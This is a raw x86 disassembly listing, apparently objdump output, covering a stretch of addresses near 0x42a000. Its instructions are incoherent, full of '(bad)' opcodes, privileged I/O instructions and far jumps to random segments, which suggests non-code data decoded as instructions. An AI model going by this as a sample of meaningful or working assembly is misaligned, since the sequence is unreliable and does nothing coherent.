  429994:	sub    BYTE PTR [ebx],bh
  429996:	ror    DWORD PTR [edx+0x4281fb10],cl
  42999c:	sub    eax,DWORD PTR [edx-0x2e]
  42999f:	sbb    edi,DWORD PTR [esi]
  4299a1:	inc    esi
  4299a2:	inc    edx
  4299a3:	rcl    DWORD PTR [ecx-0x69c42492],cl
  4299a9:	mov    dh,0xc9
  4299ab:	xchg   BYTE PTR [ebx],ah
  4299ad:	xchg   ebp,eax
  4299ae:	cdq    
  4299af:	push   ds
  4299b0:	mov    WORD PTR [eax+0x3e27cbcb],es
  4299b6:	aam    0xee
  4299b8:	adc    ebx,DWORD PTR [edi+0x7b]
  4299bb:	inc    esi
  4299bc:	mov    esi,0xe9ce250f
  4299c1:	arpl   sp,dx
  4299c3:	jnp    0x4299db
  4299c5:	push   ebx
  4299c6:	xor    al,ah
  4299c8:	std    
  4299c9:	xor    ebx,DWORD PTR [eax-0x27]
  4299cc:	pop    DWORD PTR [edi-0x19a3eceb]
  4299d2:	dec    edx
  4299d3:	test   al,0xd7
  4299d5:	outs   dx,DWORD PTR ds:[esi]
  4299d6:	shl    edx,cl
  4299d8:	hlt    
  4299d9:	mov    dl,0x93
  4299db:	std    
  4299dc:	ficomp DWORD PTR [eax+0x62]
  4299df:	sbb    BYTE PTR [eax-0x74],al
  4299e2:	adc    BYTE PTR [edi-0x235900c4],dh
  4299e8:	ds xor al,0xe9
  4299eb:	sbb    dh,bl
  4299ed:	lahf   
  4299ee:	outs   dx,DWORD PTR ds:[esi]
  4299ef:	dec    ebp
  4299f0:	jnp    0x4299ab
  4299f2:	push   ecx
  4299f3:	cmp    al,ch
  4299f5:	and    bh,bl
  4299f7:	sbb    bl,BYTE PTR [ebx+0x5e3eacfa]
  4299fd:	sbb    al,0x45
  4299ff:	lds    edi,FWORD PTR [ebx-0xb3e2549]
  429a05:	dec    edi
  429a06:	push   ecx
  429a07:	dec    ebp
  429a08:	jo     0x42998d
  429a0a:	push   esi
  429a0b:	sub    edx,DWORD PTR [ebx+0x6cafd338]
  429a11:	mov    bl,0x7b
  429a13:	mov    ebp,0x62632ce2
  429a18:	jl     0x4299be
  429a1a:	or     al,0xda
  429a1c:	sub    eax,0xfe267b53
  429a21:	push   ss
  429a22:	jecxz  0x4299e3
  429a24:	inc    ebp
  429a25:	xor    dh,cl
  429a27:	mov    cs,WORD PTR [edi]
  429a29:	mov    esi,0x55e01eeb
  429a2e:	fs jp  0x429a15
  429a31:	mov    bl,0x73
  429a33:	add    BYTE PTR [eax+eax*1],bl
	...
  429a96:	into   
  429a97:	std    
  429a98:	sti    
  429a99:	leave  
  429a9a:	sti    
  429a9b:	iret   
  429a9c:	(bad)  
  429a9d:	jmp    DWORD PTR [ecx]
  429a9f:	dec    eax
  429aa0:	mov    edi,0xff357913
  429aa5:	fld    QWORD PTR [ebp-0x43]
  429aa8:	add    DWORD PTR [eax],eax
  429aaa:	pop    es
  429aab:	add    DWORD PTR [eax],eax
  429aad:	add    BYTE PTR [edx],bh
  429aaf:	(bad)  
  429ab0:	sbb    cl,BYTE PTR [edi-0x48b50c3c]
  429ab6:	mov    dl,0x0
  429ab8:	mov    BYTE PTR fs:[eax+0x62fa4906],ah
  429abf:	hlt    
  429ac0:	inc    eax
  429ac1:	fstp   TBYTE PTR [ebp+0x71]
  429ac4:	add    al,dh
  429ac6:	pusha  
  429ac7:	mov    ch,0xd2
  429ac9:	ds jl  0x429b2e
  429acc:	mov    ebp,0x53aea2b2
  429ad1:	xchg   edx,eax
  429ad2:	dec    eax
  429ad3:	mov    ebx,0xcc7c37d6
  429ad8:	ficom  WORD PTR [ebp-0x975444d]
  429ade:	fiadd  WORD PTR [ecx]
  429ae0:	aam    0x67
  429ae2:	pop    ecx
  429ae3:	sub    ebp,DWORD PTR [edi+0x47dbeceb]
  429ae9:	repz adc eax,0x381f8a4c
  429aef:	hlt    
  429af0:	(bad)  
  429af1:	jnp    0x429b15
  429af3:	push   esp
  429af4:	cmp    BYTE PTR [eax],ah
  429af6:	push   ecx
  429af7:	je     0x429ae2
  429af9:	mov    ch,0x8b
  429afb:	aas    
  429afc:	(bad)  
  429afd:	hlt    
  429afe:	push   edi
  429aff:	and    BYTE PTR [esi+0x1408745c],0x86
  429b06:	push   esi
  429b07:	mov    WORD PTR [eax],fs
  429b09:	stos   BYTE PTR es:[edi],al
  429b0a:	int3   
  429b0b:	or     DWORD PTR [ebx-0x1f],ebp
  429b0e:	fwait
  429b0f:	push   es
  429b10:	mov    ds:0xadf438aa,al
  429b15:	jb     0x429b86
  429b17:	dec    ecx
  429b18:	sbb    cl,BYTE PTR [esi-0x7e]
  429b1b:	add    eax,0x5ef7e66a
  429b20:	ja     0x429ad5
  429b22:	test   eax,0x8fdb5aee
  429b27:	pushf  
  429b28:	add    ecx,edi
  429b2a:	lock loope 0x429b91
  429b2d:	jecxz  0x429baa
  429b2f:	sub    al,0xcb
  429b31:	or     al,0x9b
  429b33:	mov    ebx,DWORD PTR [ebp+edi*8-0x707b5f8]
  429b3a:	popf   
  429b3b:	lea    edi,[ebx-0x60]
  429b3e:	(bad)  
  429b3f:	jb     0x429b7f
  429b41:	sbb    eax,0x95a69528
  429b46:	nop
  429b47:	lea    esp,[eax+0x49]
  429b4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429b4b:	dec    ebp
  429b4c:	adc    BYTE PTR [ebx-0x391858c3],ah
  429b52:	sub    ah,BYTE PTR [eax-0xb]
  429b55:	ret    
  429b56:	jecxz  0x429aef
  429b58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429b59:	arpl   WORD PTR [esi-0x8],ax
  429b5c:	jmp    0x2b1f3e6
  429b61:	push   es
  429b62:	or     DWORD PTR [ecx+0x782e85c],ebx
  429b68:	hlt    
  429b69:	daa    
  429b6a:	jg     0x429b86
  429b6c:	das    
  429b6d:	jl     0x429bc0
  429b6f:	and    al,0xae
  429b71:	inc    edi
  429b72:	push   0x74
  429b74:	(bad)  
  429b76:	mov    BYTE PTR [edx+0x5],bh
  429b79:	pusha  
  429b7a:	sbb    al,0x78
  429b7c:	shl    BYTE PTR [eax],1
  429b7e:	add    al,0x39
  429b80:	(bad)  
  429b81:	jge    0x429bdb
  429b83:	and    eax,0x7ed245a
  429b88:	jl     0x429b56
  429b8a:	stc    
  429b8b:	cld    
  429b8c:	scas   al,BYTE PTR es:[edi]
  429b8d:	sti    
  429b8e:	jmp    0xfea2:0x224813a
  429b95:	jns    0x429c03
  429b97:	push   ebp
  429b98:	(bad)  
  429b99:	jo     0x429be2
  429b9b:	and    BYTE PTR [edi],cl
  429b9d:	mov    ds:0xe0ea60a1,al
  429ba2:	dec    edx
  429ba3:	test   al,0x1b
  429ba5:	je     0x429c18
  429ba7:	dec    edi
  429ba8:	sbb    al,0x30
  429baa:	pop    ebp
  429bab:	cmp    al,0x6c
  429bad:	enter  0x7080,0x7
  429bb1:	sbb    DWORD PTR [ebp+0x65],ebx
  429bb4:	js     0x429bb6
	...
  429c16:	mov    ds:0xb788a616,eax
  429c1b:	mov    eax,0x52a3faf
  429c20:	xchg   esp,eax
  429c21:	pop    eax
  429c22:	packssdw mm6,QWORD PTR [ebx]
  429c25:	les    ecx,FWORD PTR [esi+edi*4+0x1]
  429c29:	add    BYTE PTR [edi],al
  429c2b:	add    DWORD PTR [eax],eax
  429c2d:	add    BYTE PTR [ecx+edi*4+0x213cebf6],bl
  429c34:	mov    eax,ds:0xc3689e2c
  429c39:	dec    ebp
  429c3a:	ret    
  429c3b:	fdivr  st,st(2)
  429c3d:	inc    esp
  429c3e:	(bad)  [edx+0x55]
  429c41:	repz ss pusha 
  429c44:	dec    esp
  429c45:	mov    cl,0x23
  429c47:	call   0xceb6b5bd
  429c4c:	sbb    BYTE PTR [edx+ecx*4],ah
  429c4f:	imul   ebp,DWORD PTR [esi+0x18],0x68
  429c53:	int    0x58
  429c55:	pop    esp
  429c56:	jno    0x429c22
  429c58:	sbb    edx,DWORD PTR [edx]
  429c5a:	push   ecx
  429c5b:	and    bh,BYTE PTR [eax+0x30]
  429c5e:	mov    ecx,0xbf733ccd
  429c63:	pop    eax
  429c64:	add    DWORD PTR [esp+ecx*2-0x66],ebx
  429c68:	das    
  429c69:	jb     0x429c75
  429c6b:	addr16 dec ebp
  429c6d:	xchg   esp,eax
  429c6e:	mov    esp,0xdf2a351
  429c73:	push   ss
  429c74:	cmp    BYTE PTR [eax-0x7f],bl
  429c77:	push   0x94292fd3
  429c7c:	jp     0x429cbe
  429c7e:	jne    0x429c55
  429c80:	pop    eax
  429c81:	cdq    
  429c82:	xchg   ebp,eax
  429c83:	push   edx
  429c84:	outs   dx,DWORD PTR ds:[esi]
  429c85:	adc    DWORD PTR [eax-0x4a],0xfffffff6
  429c89:	xchg   ebx,eax
  429c8a:	push   cs
  429c8b:	dec    eax
  429c8c:	jge    0x429cb7
  429c8e:	imul   ecx,eax,0xffffffa2
  429c91:	enter  0x3057,0x7f
  429c95:	ror    DWORD PTR [edi-0x74],0x8a
  429c99:	pop    dx
  429c9b:	cmp    dl,BYTE PTR [ebx-0x69873025]
  429ca1:	mov    esi,0x7a6a04a0
  429ca6:	jnp    0x429ca5
  429ca8:	jle    0x429cc3
  429caa:	shl    edx,0xb8
  429cad:	jo     0x429ca6
  429caf:	push   cs
  429cb0:	test   BYTE PTR [esi+0x3e],dl
  429cb3:	cwde   
  429cb4:	hlt    
  429cb5:	lock dec eax
  429cb7:	xlat   BYTE PTR ds:[ebx]
  429cb8:	fist   DWORD PTR [ebp-0x15]
  429cbb:	mov    esp,DWORD PTR [esi]
  429cbd:	push   edx
  429cbe:	lahf   
  429cbf:	repz pop esp
  429cc1:	push   0x1f
  429cc3:	cmp    ebx,DWORD PTR [eax+0x1119ff27]
  429cc9:	or     DWORD PTR [edx],ecx
  429ccb:	imul   ebp,DWORD PTR [ecx],0x8fb93af0
  429cd1:	push   ebx
  429cd2:	mov    WORD PTR [esi-0x52d413df],fs
  429cd8:	mov    cl,0x60
  429cda:	adc    al,0xb4
  429cdc:	xchg   esp,eax
  429cdd:	mov    ah,0xde
  429cdf:	int3   
  429ce0:	push   eax
  429ce1:	(bad)  
  429ce2:	sub    DWORD PTR [edi-0x6fd68994],esi
  429ce8:	hlt    
  429ce9:	fldenv [ebp-0x102052c9]
  429cef:	dec    ecx
  429cf0:	repnz pushf 
  429cf2:	cmp    al,0x6a
  429cf4:	imul   DWORD PTR [eax]
  429cf6:	mov    ch,0xdf
  429cf8:	stos   BYTE PTR es:[edi],al
  429cf9:	xlat   BYTE PTR ds:[ebx]
  429cfa:	jmp    0xc6f9d007
  429cff:	shr    BYTE PTR [esi],cl
  429d01:	stc    
  429d02:	inc    edi
  429d03:	shl    BYTE PTR ss:[esi],0x7b
  429d07:	ret    0xa912
  429d0a:	mov    ah,0xdb
  429d0c:	(bad)  
  429d0d:	(bad)  
  429d0e:	jmp    FWORD PTR [eax]
  429d10:	push   edx
  429d11:	jmp    0xce3b:0xa7d54a0c
  429d18:	aaa    
  429d19:	mov    edi,0x61a2457e
  429d1e:	rol    bh,cl
  429d20:	das    
  429d21:	push   ecx
  429d22:	xor    al,BYTE PTR ds:0x411c5e1a
  429d28:	lds    ecx,FWORD PTR [esi+0x1a]
  429d2b:	inc    esi
  429d2c:	cmp    eax,0x1b003b6b
  429d31:	fcomp  QWORD PTR [esi+edi*4]
  429d34:	fwait
	...
  429d95:	add    BYTE PTR [ebx-0x13f33b49],bl
  429d9b:	jg     0x429d78
  429d9d:	mov    bh,0xb8
  429d9f:	xor    al,0xdf
  429da1:	sub    eax,0x71828f4
  429da6:	push   ebx
  429da7:	mov    edi,0x1070001
  429dac:	add    BYTE PTR [eax],al
  429dae:	retf   
  429daf:	xor    eax,0x9573d5d3
  429db4:	xor    al,0xa8
  429db6:	fistp  DWORD PTR [eax]
  429db8:	loope  0x429dee
  429dba:	add    BYTE PTR [ecx-0x161c711e],0x10
  429dc1:	ins    BYTE PTR es:[edi],dx
  429dc2:	rcl    DWORD PTR es:[esi+0x7],0xe6
  429dc7:	mov    edx,0xaed30efe
  429dcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429dcd:	lock push 0xd6d1486d
  429dd3:	fs call 0x8586f72e
  429dd9:	fwait
  429dda:	aam    0x59
  429ddc:	loope  0x429e39
  429dde:	cmp    al,0x48
  429de0:	xchg   edx,eax
  429de1:	sbb    al,0x55
  429de3:	jbe    0x429e24
  429de5:	aam    0x9c
  429de7:	jns    0x429d90
  429de9:	xchg   esi,eax
  429dea:	loope  0x429e0b
  429dec:	arpl   WORD PTR [edi-0x22c36415],dx
  429df2:	jl     0x429dde
  429df4:	fwait
  429df5:	sbb    al,0xfb
  429df7:	dec    esp
  429df8:	bound  ebx,QWORD PTR [edx+0x62]
  429dfb:	bound  eax,QWORD PTR [eax-0x4c]
  429dfe:	lods   eax,DWORD PTR ds:[esi]
  429dff:	loopne 0x429df7
  429e01:	mov    ah,0x45
  429e03:	push   0x1654a12b
  429e08:	dec    ecx
  429e09:	aam    0xb7
  429e0b:	mov    ds:0xf58ea52d,eax
  429e10:	sbb    ch,BYTE PTR [ecx+0x5ab5adc7]
  429e16:	in     al,0x85
  429e18:	imul   esi,DWORD PTR [esi-0x47],0xb762e09e
  429e1f:	imul   ecx,DWORD PTR [edi-0x5b],0x28ff8e00
  429e26:	push   0x135f3cec
  429e2b:	xlat   BYTE PTR ds:[ebx]
  429e2c:	cwde   
  429e2d:	ret    
  429e2e:	push   es
  429e2f:	or     eax,0xb1daaaed
  429e34:	jp     0x429e03
  429e36:	push   0x860212aa
  429e3b:	or     ecx,eax
  429e3d:	out    dx,al
  429e3e:	sbb    BYTE PTR [edx-0x7083f883],cl
  429e44:	(bad)  
  429e45:	sub    eax,ebx
  429e47:	jae    0x429dfd
  429e49:	xchg   esp,eax
  429e4a:	daa    
  429e4b:	inc    esp
  429e4c:	mov    eax,0x9f5deb25
  429e51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429e52:	sti    
  429e53:	sbb    DWORD PTR [ebx+0x42],0x8761c30c
  429e5a:	popa   
  429e5b:	jp     0x429ec8
  429e5d:	mov    BYTE PTR [esi],bl
  429e5f:	jne    0x429ec6
  429e61:	xchg   ecx,eax
  429e62:	push   edx
  429e63:	das    
  429e64:	cmp    al,0x7
  429e66:	stos   BYTE PTR es:[edi],al
  429e67:	(bad)  
  429e68:	mov    eax,0x238d5ee1
  429e6d:	jecxz  0x429e8b
  429e6f:	xor    BYTE PTR [ebx+0xa386e5f],bl
  429e75:	mov    esp,0xb02139d4
  429e7a:	imul   eax,DWORD PTR [edx],0xfffffff5
  429e7d:	out    dx,al
  429e7e:	rcr    DWORD PTR [edx-0x27fcfa4b],0x14
  429e85:	ins    DWORD PTR es:[edi],dx
  429e86:	xchg   ebx,eax
  429e87:	js     0x429e74
  429e89:	aam    0xed
  429e8b:	scas   eax,DWORD PTR es:[edi]
  429e8c:	jnp    0x429f01
  429e8e:	loope  0x429eb0
  429e90:	inc    eax
  429e91:	iret   
  429e92:	pop    ecx
  429e93:	stc    
  429e94:	sahf   
  429e95:	jbe    0x429ed6
  429e97:	(bad)  
  429e98:	jp     0x429e1a
  429e9a:	dec    esi
  429e9b:	mov    cl,BYTE PTR [esp+0x1b]
  429e9f:	sar    BYTE PTR [ebx-0x28633fb2],1
  429ea5:	mov    esi,0x501d6555
  429eaa:	cmp    al,0xbe
  429eac:	adc    BYTE PTR [eax+0x6d37549c],cl
  429eb2:	mov    esi,0x81fc
	...
  429f13:	add    BYTE PTR [eax],al
  429f15:	add    BYTE PTR [ecx],dh
  429f17:	inc    ebp
  429f18:	enter  0xfc06,0x8f
  429f1c:	push   DWORD PTR [edi+0x54]
  429f1f:	into   
  429f20:	fnstcw WORD PTR ds:0x8ee394ef
  429f26:	pop    edx
  429f27:	rol    BYTE PTR [ecx],0x0
  429f2a:	pop    es
  429f2b:	add    DWORD PTR [eax],eax
  429f2d:	add    BYTE PTR [edi],dh
  429f2f:	sar    DWORD PTR [ecx-0x4ef3fc37],1
  429f35:	outs   dx,BYTE PTR ss:[esi]
  429f37:	xor    al,0xfa
  429f39:	inc    edi
  429f3a:	dec    ecx
  429f3b:	cmp    ch,BYTE PTR [edx]
  429f3d:	xchg   edx,eax
  429f3e:	mov    bl,0xfd
  429f40:	bound  eax,QWORD PTR [ecx-0x226779e2]
  429f46:	push   ebp
  429f47:	mov    ecx,cs
  429f49:	js     0x429fa9
  429f4b:	inc    eax
  429f4c:	mov    edi,0xe4000e3c
  429f51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429f52:	sbb    DWORD PTR [esi+0x2a],0xffffffd1
  429f56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429f57:	xor    BYTE PTR [ebx-0xe],al
  429f5a:	inc    esi
  429f5b:	dec    edi
  429f5c:	stc    
  429f5d:	adc    dh,ch
  429f5f:	dec    ebx
  429f61:	jl     0x429f5a
  429f63:	adc    al,0x3f
  429f65:	mov    BYTE PTR [ecx+ebp*1+0x52d2d837],bl
  429f6c:	jecxz  0x429fbd
  429f6e:	and    eax,0xdcbe87ba
  429f73:	lahf   
  429f74:	inc    DWORD PTR [ebp-0x74]
  429f77:	lods   eax,DWORD PTR ds:[esi]
  429f78:	jne    0x429f83
  429f7a:	imul   ecx,DWORD PTR [edi+0x2e],0xfffffffd
  429f7e:	les    eax,FWORD PTR [edx+eiz*1]
  429f81:	mov    edi,ebx
  429f83:	inc    eax
  429f84:	mov    ch,dh
  429f86:	in     al,0x28
  429f88:	(bad)  
  429f89:	push   es
  429f8a:	mov    BYTE PTR [eax+0x639a86ca],dh
  429f90:	sub    eax,0xfe908c93
  429f95:	je     0x429f84
  429f97:	jmp    0x556c9ba9
  429f9c:	iret   
  429f9d:	lods   eax,DWORD PTR ds:[esi]
  429f9e:	loopne 0x42a00b
  429fa0:	add    eax,0x262c9026
  429fa5:	ss (bad) 
  429fa7:	pop    esi
  429fa8:	retf   0xad46
  429fab:	xchg   ebp,eax
  429fac:	icebp  
  429fad:	jne    0x429f64
  429faf:	lods   eax,DWORD PTR ds:[esi]
  429fb0:	fld    QWORD PTR [ebx+0x51]
  429fb3:	into   
  429fb4:	inc    ebp
  429fb5:	out    dx,eax
  429fb6:	std    
  429fb7:	in     al,0x43
  429fb9:	cmp    eax,0x727a5bea
  429fbe:	mov    dl,0x6b
  429fc0:	mov    dh,0xb5
  429fc2:	lods   eax,DWORD PTR ds:[esi]
  429fc3:	mov    BYTE PTR [esi+0x5],cl
  429fc6:	mov    bh,0x72
  429fc8:	aas    
  429fc9:	fdiv   st(3),st
  429fcb:	mov    ch,0xac
  429fcd:	add    DWORD PTR [edi-0x75],eax
  429fd0:	or     DWORD PTR [edi],eax
  429fd2:	popf   
  429fd3:	push   ss
  429fd4:	data16 sub BYTE PTR [ebx],bh
  429fd7:	jmp    0x75386f72
  429fdc:	cmp    edx,DWORD PTR [edx+edi*1-0x7b]
  429fe0:	rol    eax,0x1f
  429fe3:	xchg   ebp,eax
  429fe4:	adc    cl,ch
  429fe6:	xor    ebx,DWORD PTR [esi-0x240df0d6]
  429fec:	(bad)  
  429fed:	sub    BYTE PTR [edx+0x49],ch
  429ff0:	adc    BYTE PTR [ebx],dl
  429ff2:	addr16 jne 0x429fe8
  429ff5:	mov    esp,ebx
  429ff7:	sti    
  429ff8:	pop    ebp
  429ff9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429ffa:	jns    0x429f9a
  429ffc:	and    eax,0xa50b44bd
  42a001:	dec    edi
  42a002:	xor    edi,DWORD PTR [esi]
  42a004:	dec    ecx
  42a005:	ins    DWORD PTR es:[edi],dx
  42a006:	js     0x429fcc
  42a008:	mov    ch,BYTE PTR [esi+0x53c504c]
  42a00e:	jmp    0x1e70:0xdd3a4e2e
  42a015:	pop    ebx
  42a016:	and    al,0x1e
  42a018:	popa   
  42a019:	call   0xd38f:0x18fc6b3e
  42a020:	ds cmp al,0xce
  42a023:	in     eax,dx
  42a024:	repz shl edi,cl
  42a027:	jns    0x42a049
  42a029:	cdq    
  42a02a:	cmp    BYTE PTR [esi],dl
  42a02c:	push   edx
  42a02d:	das    
  42a02e:	mov    eax,DWORD PTR [eax+0x1a]
  42a031:	scas   al,BYTE PTR es:[edi]
  42a032:	inc    esp
  42a033:	lods   eax,DWORD PTR ds:[esi]
  42a034:	popa   
	...
  42a095:	add    bh,dl
  42a097:	pushf  
  42a098:	shr    BYTE PTR [ebp-0x1000235],0x30
  42a09f:	xchg   esi,eax
  42a0a0:	mov    esi,0xa606c4e
  42a0a5:	aad    0x61
  42a0a7:	rol    DWORD PTR [ecx],0x0
  42a0aa:	pop    es
  42a0ab:	add    DWORD PTR [eax],eax
  42a0ad:	add    BYTE PTR ds:0xf0fd4a03,dl
  42a0b3:	xchg   BYTE PTR [edx-0x1334cf3b],ch
  42a0b9:	or     ch,ah
  42a0bb:	outs   dx,DWORD PTR ds:[esi]
  42a0bc:	mov    dl,BYTE PTR ds:0x24a39c1e
  42a0c2:	jno    0x42a073
  42a0c4:	mov    ebp,0x3c4710aa
  42a0c9:	mov    bl,0xab
  42a0cb:	adc    al,0x7b
  42a0cd:	xor    ebx,DWORD PTR [ebx]
  42a0cf:	mov    ebp,0xa126910e
  42a0d4:	cld    
  42a0d5:	fmul   DWORD PTR [ebp+0x55]
  42a0d8:	ins    BYTE PTR es:[edi],dx
  42a0d9:	mov    BYTE PTR [esi],ch
  42a0db:	sbb    eax,ebx
  42a0dd:	sub    ch,BYTE PTR [edi+0x7c20a7f9]
  42a0e3:	stos   BYTE PTR es:[edi],al
  42a0e4:	mov    WORD PTR fs:[ebp+eax*1-0x7],fs
  42a0e9:	daa    
  42a0ea:	mov    edi,0x25165492
  42a0ef:	lds    esp,FWORD PTR [ecx]
  42a0f1:	data16 in al,dx
  42a0f3:	xor    bl,BYTE PTR [edi-0xe446567]
  42a0f9:	cld    
  42a0fa:	outs   dx,DWORD PTR ds:[esi]
  42a0fb:	xabort 0xb1
  42a0fe:	xchg   esp,eax
  42a100:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a101:	int    0x36
  42a103:	cmc    
  42a104:	add    DWORD PTR [eax+0x46],eax
  42a107:	pop    edx
  42a108:	xchg   edx,eax
  42a109:	push   es
  42a10a:	lods   al,BYTE PTR ds:[esi]
  42a10b:	pop    edi
  42a10c:	mov    ecx,DWORD PTR [ebx+0x75]
  42a10f:	jnp    0x42a17d
  42a111:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a112:	aad    0x6
  42a114:	sahf   
  42a115:	jecxz  0x42a193
  42a117:	adc    BYTE PTR [ecx+0x43],dh
  42a11a:	out    dx,al
  42a11b:	mov    ebp,0xfea5c91a
  42a120:	scas   al,BYTE PTR es:[edi]
  42a121:	cmp    ah,BYTE PTR [ebx-0x33]
  42a124:	jmp    0x42a10c
  42a126:	xor    esp,DWORD PTR [ebx+0x324e8b3]
  42a12c:	ror    edx,1
  42a12e:	mov    ds:0xabea23d8,al
  42a133:	mov    BYTE PTR [ecx],ah
  42a135:	push   esp
  42a136:	push   ecx
  42a137:	jle    0x42a128
  42a139:	ins    DWORD PTR es:[edi],dx
  42a13a:	mov    eax,0x119aa991
  42a13f:	outs   dx,BYTE PTR ds:[esi]
  42a140:	adc    ah,BYTE PTR cs:[edi]
  42a143:	aaa    
  42a144:	push   0x2793c7ee
  42a149:	add    esi,DWORD PTR [ecx-0x147799b7]
  42a14f:	out    0xb5,eax
  42a151:	bound  ebp,QWORD PTR [eax]
  42a153:	inc    ecx
  42a154:	dec    ecx
  42a155:	adc    BYTE PTR [ecx],ah
  42a157:	pop    esp
  42a158:	rcl    BYTE PTR [ecx],1
  42a15a:	out    dx,eax
  42a15b:	xor    ecx,DWORD PTR [ebx-0x335e1431]
  42a161:	(bad)  
  42a162:	cmp    edx,esi
  42a164:	retf   
  42a165:	cmp    al,0x5b
  42a167:	das    
  42a168:	or     al,0xfa
  42a16a:	xchg   BYTE PTR [edx+0x2a7ad556],cl
  42a170:	out    0x81,al
  42a172:	scas   al,BYTE PTR es:[edi]
  42a173:	dec    DWORD PTR [ebx+ebp*2+0x4]
  42a177:	pop    edx
  42a178:	push   0x22c3574c
  42a17d:	pop    ss
  42a17e:	ret    
  42a17f:	fstp   DWORD PTR [eax-0x7c7dcf9c]
  42a185:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a186:	ret    
  42a187:	sar    esi,1
  42a189:	add    BYTE PTR [ebx-0x163856a3],al
  42a18f:	jg     0x42a19f
  42a191:	dec    edi
  42a192:	out    dx,eax
  42a193:	and    DWORD PTR [ebp-0x1a918ab3],ecx
  42a199:	mov    al,ds:0x6c4f97a9
  42a19e:	(bad)  
  42a19f:	mul    DWORD PTR [edi+0x2be8240d]
  42a1a5:	push   edi
  42a1a6:	das    
  42a1a7:	xor    eax,0xde20c31
  42a1ac:	dec    edx
  42a1ad:	(bad)  
  42a1ae:	mov    esp,0x2b74d744
  42a1b3:	mov    BYTE PTR [edx+0x0],al
	...
  42a216:	sub    eax,DWORD PTR [ebp+0x19bf1995]
  42a21c:	scas   eax,DWORD PTR es:[edi]
  42a21d:	mov    bh,0x15
  42a21f:	fucomip st,st(5)
  42a221:	imul   eax,DWORD PTR [edx+0x681409c5],0x70001c2
  42a22b:	add    DWORD PTR [eax],eax
  42a22d:	add    BYTE PTR [esi],al
  42a22f:	fld    QWORD PTR [eax+edx*4-0x9]
  42a233:	fidiv  DWORD PTR [edi+ebp*2-0x7dc72455]
  42a23a:	retf   0xb111
  42a23d:	lahf   
  42a23e:	cmp    bh,0x63
  42a241:	outs   dx,DWORD PTR ds:[esi]
  42a242:	leave  
  42a243:	call   0x6bc2ccda
  42a248:	addr16 popf 
  42a24a:	aad    0x7f
  42a24c:	jp     0x42a292
  42a24e:	and    ecx,esp
  42a250:	cs dec eax
  42a252:	mov    ebp,0xce5baebe
  42a257:	cmc    
  42a258:	enter  0x7af5,0x41
  42a25c:	pop    ebp
  42a25d:	adc    al,BYTE PTR [edx+0x4]
  42a260:	adc    eax,0x3ca0dc78
  42a265:	rep stos DWORD PTR es:[edi],eax
  42a267:	jle    0x42a1f1
  42a269:	push   ss
  42a26a:	xchg   ebp,eax
  42a26b:	pop    eax
  42a26c:	jge    0x42a252
  42a26e:	fld    QWORD PTR [ebp-0x69e517cf]
  42a274:	sbb    eax,0x51435125
  42a279:	je     0x42a2e4
  42a27b:	xchg   edx,eax
  42a27c:	fsubr  DWORD PTR [ecx-0x76035e1f]
  42a282:	sti    
  42a283:	pop    edi
  42a284:	call   0x4330:0xdf654ee8
  42a28b:	dec    eax
  42a28c:	aam    0xf8
  42a28e:	call   0xd16c:0x48489e5b
  42a295:	pop    esi
  42a296:	(bad)  
  42a297:	and    eax,0xf029fde5
  42a29c:	in     al,dx
  42a29d:	sub    eax,0xa65e7ff
  42a2a2:	jbe    0x42a272
  42a2a4:	xor    al,0x58
  42a2a6:	cmp    esp,DWORD PTR [esi+0x329fb6b8]
  42a2ac:	add    al,0x6b
  42a2ae:	dec    esi
  42a2af:	jg     0x42a2f2
  42a2b1:	sbb    al,0xef
  42a2b3:	daa    
  42a2b4:	mov    ds:0xf3b670a4,eax
  42a2b9:	inc    ebx
  42a2ba:	inc    edx
  42a2bb:	mov    edx,0x1e9e5b80
  42a2c0:	mov    dl,0x84
  42a2c2:	jmp    0xfb40:0xe37457a6
  42a2c9:	dec    esp
  42a2ca:	daa    
  42a2cb:	test   DWORD PTR [eax+ebx*2+0x1bff6516],edx
  42a2d2:	mov    es,WORD PTR [ecx]
  42a2d4:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  42a2d6:	dec    ebx
  42a2d7:	sub    DWORD PTR [ebp-0x30feb99b],edx
  42a2dd:	pop    ds
  42a2de:	or     DWORD PTR [ecx],0x4fea3dda
  42a2e4:	outs   dx,DWORD PTR ds:[esi]
  42a2e5:	mov    ecx,0xc7d23aac
  42a2ea:	mov    esi,0x537f124a
  42a2ef:	int    0x6f
  42a2f1:	jmp    0x64ab:0x15dd3954
  42a2f8:	mov    ebx,0x4b235637
  42a2fd:	xchg   esp,eax
  42a2fe:	ins    BYTE PTR es:[edi],dx
  42a2ff:	mov    ebp,0xfb76e4c3
  42a304:	loopne 0x42a2bf
  42a306:	sub    ah,BYTE PTR [edi+esi*1+0x25f02f9c]
  42a30d:	cmp    al,0x1e
  42a30f:	and    al,BYTE PTR [eax]
  42a311:	out    0x35,eax
  42a313:	call   0x46c8:0x8828d402
  42a31a:	cli    
  42a31b:	loopne 0x42a2ac
  42a31d:	retf   0x77c3
  42a320:	repnz test al,0x45
  42a323:	loopne 0x42a32a
  42a325:	lahf   
  42a326:	(bad)  
  42a327:	fdiv   QWORD PTR [edx+0x5d8aa42f]
  42a32d:	mov    eax,ds:0x41369dcd
  42a332:	pop    ecx
  42a333:	xor    eax,0x69
	...
  42a394:	add    BYTE PTR [eax],al
  42a396:	jg     0x42a3a6
  42a398:	jne    0x42a3d5
  42a39a:	jne    0x42a417
  42a39c:	jg     0x42a3ec
  42a39e:	ds loop 0x42a3ca
  42a3a1:	retf   0xef2e
  42a3a4:	and    BYTE PTR [edi+ebp*2-0x3d],cl
  42a3a8:	add    DWORD PTR [eax],eax
  42a3aa:	pop    es
  42a3ab:	add    DWORD PTR [eax],eax
  42a3ad:	add    BYTE PTR [esi+edx*4-0x4baca0c5],dh
  42a3b4:	outs   dx,BYTE PTR ds:[esi]
  42a3b5:	pop    ecx
  42a3b6:	and    BYTE PTR [ebp+0x16],bl
  42a3b9:	out    dx,eax
